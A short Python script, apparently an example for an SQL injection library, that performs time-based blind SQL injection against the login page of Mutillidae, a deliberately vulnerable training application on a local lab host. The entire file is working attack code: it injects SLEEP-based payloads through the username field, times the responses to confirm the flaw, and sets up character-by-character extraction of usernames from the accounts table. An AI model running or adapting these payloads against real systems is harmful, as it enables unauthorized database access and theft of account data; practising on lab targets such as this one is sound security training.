#!/bin/python

import requests
from sqlexploit import SqliExploit, MySqlConfig
from string import Template

# config
sleep_duration = 1

# payload execution configuration
def exec_request(request: str) -> bool:
    url = "http://meta.local/mutillidae/index.php?page=login.php"
    datas = {
        'username': f"test' AND {request} #",
        'password': "pass",
        'login-php-submit-button': "Login",
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    res = requests.post(url, data=datas, headers=headers)
    print(f"[PAYLOAD] {request} in {res.elapsed.seconds} secs")
    return res.elapsed.seconds >= sleep_duration

# Method 1 : check for the current request
rq = "SELECT username FROM accounts ORDER BY username LIMIT 1,1"
exploiter = SqliExploit(MySqlConfig(), exec_request)
template_for_extract_string = Template(
    f'(SELECT 1 FROM (SELECT(SLEEP(IF(ORD(MID(($request),$index,1))$test,{sleep_duration},0))))a)'
)
exploiter.prepare_new(template=template_for_extract_string)
if(exploiter.check(rq)):
    print("Target is Vulnerable")
else:
    print("Target is not Vulnerable")

# if the request is invalid, the check fail
rq = "SELECT username FROM invalid_table ORDER BY username LIMIT 1,1"
if(exploiter.check(rq)):
    print("Target is Vulnerable")
else:
    print("Target is not Vulnerable")

# Method 2 : generic check
template_for_check = Template(f'(SELECT 1 FROM (SELECT(SLEEP({sleep_duration})))a)')
if(exploiter.check(template=template_for_check)):
    print("Target is Vulnerable")
else:
    print("Target is not Vulnerable")
